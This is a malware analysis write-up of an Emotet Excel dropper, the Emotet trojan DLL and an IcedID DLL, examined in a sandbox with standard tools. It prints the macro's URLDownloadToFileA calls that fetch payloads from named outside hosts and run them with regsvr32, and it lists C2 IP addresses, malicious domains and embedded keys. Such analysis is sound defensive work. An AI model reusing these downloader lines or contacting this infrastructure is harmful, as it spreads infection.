---
title: Emotet Analysis
date: 2023-10-17 12:00
categories: [analysis, security]
tags: [analysis, security, emotet]
---

# Overview

Emotet is a pervasive threat of malware that has many different attack vectors. In this analysis, a sample of Emotet will be examined along with the other 2 malware files that are part of the attack chain.

# Static Analysis Emotet Excel File

### [VirusTotal](https://www.virustotal.com/gui/file/ef2ce641a4e9f270eea626e8e4800b0b97b4a436c40e7af30aeb6f02566b809c)
Hash: `ef2ce641a4e9f270eea626e8e4800b0b97b4a436c40e7af30aeb6f02566b809c`


## Detect It Easy
216.5k file size, Archive: Microsoft Compound(MS Office 97-2003 or MSI etc.).
High level of entropy, `7.12275`, packed file.
Using the file command, we can see that the author of the xls file is Gydar.

![Emotet DetectItEasy](https://github.com/Dathalind/dathalind.github.io/blob/main/assets/img/emotet/detectiteasyemotetexcelfile.png?raw=true)

## Floss
Mostly junk strings extracted, but some interesting strings to pay attention to:

- "URLDownloadToFil
- s://audioselec.com/about/dDw5ggtyMojggTqhc/
- `//intolove.co.uk/wp-admin/FbGhiWtrEzrQ/`
- `//geringer-muehle.de/wp-admin/G/`
- `//isc.net.ua/themes/3rU/`
- oxnv3.ooccxx
- oxnv1.ooccxx
- oxnv4.ooccxx
- oxnv2.ooccxx
- DocumentUserPassword
- DocumentOwnerPassword
- DocumentCryptSecurity
- Microsoft Print to PDF
- {084F01FA-E634-4D77-83EE-074817C03581}

With 7-zip, we were able to drop 3 additional files onto the host:

- [5]DocumentSummaryInformation (4 KiB); not packed
    - ba78c1bdff4e499ab8fcf63e6ab4664dda42e442f849835e2d390014341cb9f4
- [5]SummaryInformation (4 KiB); not packed
    - 23b918c336f16209a9c2bb301b18abebadbd0ba02ea70fe9866e6b7f2776027f
- Workbook (205.22 KiB); entropy 7.33443
    - c562d5fc4ff2e4ac1b273aded645ea4a4741add89aaf8faf8901f3f2e2413e15
    - Applesoft BASIC program data, first line number 16

Taking a look at those files quickly, it seems like the Document summary and Summary Information both have some encrypted data, but are relatively small. 

The workbook file seems to have a huge amount of data, encrypted or machine code that is not able to be analyzed much further right now. We do see the string `“MZ”` come up in multiple places, but its hard to say if that actually signifies an executable packed in this file. 

* Going back and checking with DetectItEasy, all 3 new files are classified as “Binary”.

* The Workbook appear to be the contents we extracted from the original xls file. 

Opening the excel file, we have a warning message, telling us where we need to copy the file to and open in order to bypass the protected view in place:

![Xls Message](https://github.com/Dathalind/dathalind.github.io/blob/main/assets/img/emotet/warningmessageexcelfile.png?raw=true)

So trying to open the Workbook that was extracted, it has some interesting strings inside that clue is in more to the intentions. 

```
1FAvwC5rXJ1TH2KmUpEdtaeRn40DSBix3uhcgLdpos1
":=,\CA.L&(U-)T/REN
RETURN()e
```

Looking through the individual sheets, most are uninteresting or empty, but Sheet 4 had some interesting data:
```
- "s://audioselec.com/abo",56656436466735
    - "ut/dDw5ggtyMojggTqhc/",7656364755466430
- "s://geringer-mue",144552434315
    - "[hle[.]de/wp-admin/G/](hxxp://hle.de/wp-admin/G/)",5754235354625
- “://intolove.co.uk/w",432331536243
    - "p-admin/FbGhiWtrEzrQ/",464253243255325
- "://isc.n",574354525236
    - "[et[.]ua/themes/3rU/](hxxp://et.ua/themes/3rU/)",645422525431
```

These are labeled with 1 through 4, the top much reference the other half below it. Obfuscation by splitting these urls in half. 

* Sheet5 is empty. Same for Sheet6, still not finding the Macros.

Using a python script called Oledump.py, we can extract the stream of data from the xls file, and we can search through the output to find the interesting references such as urldownloadtofile. We also see a Microsoft Print to PDF string referenced.

Also some 36 character stings referenced: `084F01FA-E634-4D77-83EE-074817C03581`

A reference to a driver:
`hxxps://download-drivers.net/msi/laptop/msi-ms-7a34?devID=084F01FA-E634-4D77-83EE-074817C03581`

![Protection of Excel File](https://github.com/Dathalind/dathalind.github.io/blob/main/assets/img/emotet/protectedworkbookmessage.png?raw=true)

Without knowing that password, we just gonna have to analyze differently.

Interesting file written: `c2rx.sccd`

# Dynamic Analysis Emotet Excel File

In order to start dynamic analysis, we move the file over to the file path for 64 bit, and later than office 2016: `C:\Program Files\Microsoft Office\root\Templates`

Now, we will get set up for several other things to happen, ProcMon, TCPView, Wireshark, and Regshot being the main tools to check for any changes, see what child processes spawn, and view any C2 connections out.

## ProcMon
After opening the file in the templates section, we get 4 pop ups immediately that show regsvr32.exe being exploited to execute 4 strange files, files we saw referenced earlier after doing a string dump:

- C:\Windows\System32\regsvr32.exe ..\oxnv1.ooccxx
- C:\Windows\System32\regsvr32.exe ..\oxnv2.ooccxx
- C:\Windows\System32\regsvr32.exe ..\oxnv3.ooccxx
- C:\Windows\System32\regsvr32.exe ..\oxnv4.ooccxx

## Wireshark
We can see an HTTP Get request method in wireshark, a reference to a string we had seen prior: Get Request: `hxxp://intolove.co.uk/wp-admin/FbGhiWtrEzrQ/`

Another one: `hxxp://isc.net.ua/themes/3rU/`

No interesting things on the sites from urlscan.io.

We also see DNS requests to the above domains, and a couple of other interesting domains:

* `audioselec[.]com`

* `geringer-muehle[.]de`

## RegShot
Not seeing any persistence registry written, likely due to the fact that this is in an isolated environment and we didn’t download additional payloads. 

Now, time for system reset, and gonna let this system get on the internet to let it grab the other payloads. We can also do this on [tria.ge](https://tria.ge) to see what happens so we know what to expect.

- [Tria.ge](https://tria.ge) reports this 10/10 obviously for being a real infection.

So, looks like what we were expecting, but it looks like for this sample, the sites that were up to download the payloads are giving a 404, so we may not have success downloading those files. The TCP connections to the other url’s look like the C2 activity.

These are the calls directly used:
```
=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://audioselec.com/about/dDw5ggtyMojggTqhc/", "..\oxnv1.ooccxx")
=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://geringer-muehle.de/wp-admin/G/", "..\oxnv2.ooccxx")
=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://intolove.co.uk/wp-admin/FbGhiWtrEzrQ/", "..\oxnv3.ooccxx")
=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://isc.net.ua/themes/3rU/", "..\oxnv4.ooccxx")
```

Another interesting and important command to pay attention to: `C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding`

A file this xls file is supposed to download is a dll file, which is a PE64 packed binary.

# Static Analysis Emotet Trojan DLL

### [VirusTotal](https://www.virustotal.com/gui/file/bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36)
Hash: `bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36`

28 flagged imports. Cryptography is something referenced quite a bit and is flagged for this dll file. 35 flagged strings, with many other malicious strings, including some compressed strings. 

## Detect It Easy
Indicates this file is a PE64 file, but this has to be run as a dll as it is a linker file. 

It has 24 different sections of base64 compressed content.

Interesting strings:

* jkdefrag.exe
* jkdefragscreensaver.exe
* jkdefragcmd.exe

# Dynammic Analysis Emotet Trojan DLL

Executing with rundll32.exe didn’t do anything, but when we register this dll, we get more action and activity:

`C:\Windows\system32\regsvr32.exe "C:\Users\dath\AppData\Local\FbomSUOaU\iQhgZ.dll"`

Hash: `bb444759e8d9a1a91a3b94e55da2aa489bb181348805185f9b26f4287a55df36`

It copies it self here for persistence. Not seeing a reg key modified for startup or persistence. It self deletes from original location. 

Lots of attempted TCP Connections. Keeps interacting with this dll file: `C:\Windows\System32\OnDemandConnRouteHelper.dll`

- This happens if during your detonation it cannot reach out to any kind of internet connectivity. You need to either let it have internet connectivity (not advised), or you need some application to mimic/simulate internet connections.

Regsvr32.exe is cycling through multiple IP’s. Yep, part of the Epoch4 botnet. gathered all of the C2 IP’s:

```
45.235.8.30:8080
94.23.45.86:4143
119.59.103.152:8080
169.60.181.70:8080
164.68.99.3:8080
172.105.226.75:8080
107.170.39.149:8080
206.189.28.199:8080
1.234.2.232:8080
188.44.20.25:443
186.194.240.217:443
103.43.75.120:443
149.28.143.92:443
159.89.202.34:443
209.97.163.214:443
183.111.227.137:8080
129.232.188.93:443
139.59.126.41:443
110.232.117.186:8080
139.59.56.73:8080
103.75.201.2:443
91.207.28.33:8080
164.90.222.65:443
197.242.150.244:8080
212.24.98.99:8080
51.161.73.194:443
115.68.227.76:8080
159.65.88.10:8080
201.94.166.162:443
95.217.221.146:8080
173.212.193.249:8080
82.223.21.224:8080
103.132.242.26:8080
213.239.212.5:443
153.126.146.25:7080
45.176.232.124:443
182.162.143.56:443
169.57.156.166:8080
159.65.140.115:443
163.44.196.120:8080
172.104.251.154:8080
167.172.253.162:8080
91.187.140.35:8080
45.118.115.99:8080
147.139.166.154:8080
72.15.201.15:8080
149.56.131.28:8080
167.172.199.165:8080
101.50.0.91:8080
160.16.142.56:8080
185.4.135.165:8080
104.168.155.143:8080
79.137.35.198:8080
5.135.159.50:443
187.63.160.88:80
```

* eck1.plain key: `MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE86M1tQ4uK/Q1Vs0KTCk+fPEQ3cuwTyCz+gIgzky2DB5Elr60DubJW5q9Tr2dj8/gEFs0TIIEJgLTuqzx+58sdg==`

* ecs1.plain key: `MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQF90tsTY3Aw9HwZ6N9y5+be9XoovpqHyD6F5DRTl9THosAoePIs/e5AdJiYxhmV8Gq3Zw1ysSPBghxjZdDxY+Q==`

# Advanced Static Analysis Emotet Trojan DLL

(work in progress)
## Ghidra & Cutter
Entry point → leads to FUN_180005f0c

- this function, while not the “main”, appears important as it calls lots of other functions, including a function that using VirtualAlloc (FUN_18002d600)

# Advanced Dynamic Analysis Emotet Trojan DLL

(work in progress)

# Static Analysis IcedID DLL

### [VirusTotal](https://www.virustotal.com/gui/file/05a3a84096bcdc2a5cf87d07ede96aff7fd5037679f9585fee9a227c0d9cbf51)
Hash: `05a3a84096bcdc2a5cf87d07ede96aff7fd5037679f9585fee9a227c0d9cbf51`

## Detect It Easy
Pe64; dll linker file, not packed.

## PEStudio
15 flagged imports. 
![IcedId PEStudio](https://github.com/Dathalind/dathalind.github.io/blob/main/assets/img/emotet/iceidpestudioimage.png?raw=true)

Some weird sentence string inside of the file, doesn’t mean anything. Lots of repeat strings, junk strings. 

Interesting strings:

- iec61966-2-4
- iec61966-2-1
- minkernel\crts\ucrt\inc\corecrt_internal_strtox.h

# Dynamic Analysis IcedID DLL

## ProcMon
Not many processes you see in Procmon, need to dig around some more to find interesting changes. 

We do see a lot of files touched, lots of reg mods, and TCP connections in ProcMon:

- Lots of calls out over TCP traffic.

## Wireshark
Some interesting DNS requests:

- `bayernbadabum.com`
    - This domain has 20 hits for being malicious and related to malware: https://www.virustotal.com/gui/domain/bayernbadabum.com
    - The urlscan result shows the following text: “this is a sinkhole”; meaning this site has likely been turned into a sinkhole due to the malicious activity
    - https://urlscan.io/result/e09137d9-579e-4aab-931a-a95b61bf6164/
- `4.0.0.10.in-addr.arpa`
- `200.197.79.204.in-addr.arpa`
- `212.209.125.20.in-addr.arpa`
- `17.2.0.10.in-addr.arpa`
- `207.22.221.23.in-addr.arpa`
- `85.65.42.20.in-addr.arpa`

## RegShot
No persistence picked up by Regshot. 

The dll file did not self-delete. 

Dumped sample into tria.ge, it seems to run through regsvr32.exe like the trojan dll before. It had a pop up indicating something wrong with Microsoft Register Server. We let the analysis run for 5 minutes.

# Advanced Static Analysis IcedID DLL

(work in progress)
## Ghidra & Cutter
Entry point → FUN_180009e10

- the functions labeled with FUN_ don’t seem to do much, but the dllmain_raw and `dllmain_crt_dispatch` appear to have some things to execute.

# Advanced Dynamic Analysis IcedID DLL
(work in progress)